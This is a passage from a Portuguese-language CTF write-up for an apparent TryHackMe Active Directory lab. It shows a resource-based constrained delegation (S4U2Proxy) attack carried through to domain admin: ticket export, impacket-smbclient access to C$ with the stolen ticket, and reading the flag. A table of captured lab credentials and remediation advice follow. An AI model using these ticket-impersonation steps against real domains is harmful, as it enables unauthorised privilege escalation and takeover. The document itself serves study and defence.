[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```
Aqui fizemos esse processo e guardamos o TGS no arquivo .cache , iremos agora exportar.
```
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```
Exportamos ele pro env e agora iremos acessar o C$ como admin com o ticket .
```
impacket-smbclient -k -no-pass DC01.ctf.local 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Downloads
IPC$
NETLOGON
SYSVOL
# use C$
# ls
...
drw-rw-rw-          0  Thu Sep 17 16:30:39 2026 Users
drw-rw-rw-          0  Wed May 20 11:07:51 2026 Windows
# cd Users
# ls
drw-rw-rw-          0  Thu Sep 17 16:30:39 2026 .
drw-rw-rw-          0  Thu Sep 17 16:30:39 2026 ..
drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 Administrator
...
# cd Administrator
# ls
drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 .
drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 ..
drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 3D Objects
drw-rw-rw-          0  Wed Mar 17 11:00:03 2021 AppData
drw-rw-rw-          0  Wed Mar 17 11:00:03 2021 Application Data
drw-rw-rw-          0  Wed Mar 17 11:13:27 2021 Contacts
drw-rw-rw-          0  Wed Mar 17 11:00:03 2021 Cookies
drw-rw-rw-          0  Wed May 20 11:21:12 2026 Desktop
...
# cd Desktop
# ls
drw-rw-rw-          0  Wed May 20 11:21:12 2026 .
drw-rw-rw-          0  Wed May 20 11:21:12 2026 ..
-rw-rw-rw-        282  Wed Mar 17 11:13:27 2021 desktop.ini
-rw-rw-rw-         37  Thu Sep 17 13:34:39 2026 flag.txt
# cat flag.txt
THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}
```

> [!success] Credenciais Obtidas
> - **Usuários:** t.jones e r.williams
> - **Senha / Hash:** Helpdesk01!

---

## 🛡️ 3. Movimentação Lateral & Escalação de Privilégios

> [!warning] Meios utilizados e seus resultados
> 

> [!success] Acesso Root / Admin Conquistado
> - **Usuário Admin:** Administrator
> - **Senha / Hash:** No arquivo .cache que exportamos para usar ele para login no C$ do SMB
> - **Flag de Root/Admin:** THM{RBCD_S4U2Pr0xy_T1ck3t_Th3ft_2_DA}

---

## 🔑 Tabela de Credenciais Capturadas

| Serviço / Local                    | Usuário       | Senha / Hash      | Origem do Achado                            |
| :--------------------------------- | :------------ | :---------------- | :------------------------------------------ |
| Conta de domínio inicial           | j.smith       | JSmith@IT2024     | A sala nos deus as credenciais iniciais     |
| Conta de domínio                   | t.jones       | Helpdesk01!       | dabase.kdbx na pasta documentos de j.smith  |
| Não sei ainda que tipo de conta é. | Michael321    | 12345             |                                             |
| Provavelmente narquia              | User name     | Password          |                                             |
| Admin do domínio                   | Administrator | No arquivo .cache | Vetor de ataque RBCD a partir de r.williams |

---
## Remediações 
- Utilizar senhas mais fortes e não reutilizar senhas para várias contas
- Admin deve ser uma conta marcada como sensível e que não pode ser delegada.
- A permissão de r.williams poder criar contas de computador junto dele pode adicionar contas para se passarem pelo DC01 acabaram permitindo o RBCD junto do admin não sendo tratado como sensível e pode ser delegado , assim a permissão de poder criar contas deveria ser revogada e o admin ser tratado como sensível e não pode ser delegado.
---
## 📚 Considerações Técnicas & Cheat Sheet

> [!info] Lições Aprendidas
> 1. Enumerar MUIIIIITO ajuda demais , passar por cada serviço enumerando para cada usuário nos da muita informação do contexto do sistema
> 2. BloodHound ajuda demais com seus pathfinding e query's avançadas para achar vetores de ataque kerberoasting , rbcd e outros.Sempre utilizar.
> 3. RBCD aprendido nessa sala , na sala proxy havia aprendido o conceito já do ataque de impersonation e agora o impersonation foi a fase final do ataque.Na sala proxy usei uma conta de serviço com delegate permitida para cifs/dc01.ctf.local e agora utilizei uma conta de computador criada pelo usuário que comprometi.
> 4. Devemos saber a hora de parar de fuçar algo e procurar outro algo para fuçar , quando resolvi fazer a pulverização com a senha do t.jones que eu destravei , porque não havia nada do t.jones além disso que eu poderia guardar/usar.
